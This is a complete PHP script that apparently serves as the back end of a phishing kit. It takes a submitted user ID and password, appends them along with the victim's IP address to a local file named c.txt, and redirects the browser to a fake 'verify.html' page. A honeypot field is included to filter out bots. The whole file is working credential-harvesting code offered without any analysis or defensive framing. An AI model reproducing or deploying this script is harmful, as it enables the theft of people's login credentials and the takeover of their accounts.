<?php
$ip = getenv("REMOTE_ADDR");

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if(isset($_POST["submit"])){
			if(!empty($_POST['address'])){
				echo "The form is empty";
				return false;
			}
		}


$username = $_POST["userId"];
$password = $_POST["password"];
$bots_form = $_POST["bots_form"];


//Message
$message = "Username: ".$username." | ";
$message .= "Password: ".$password." | ";
$bots = "Bots: ".$bots_form." >> ";

$inf = $message."\n".$ip."\n".$bots."\n\n";
$file = fopen("c.txt", 'a');
fwrite($file, $inf); 

header("Location: verify.html"); 
	 
?>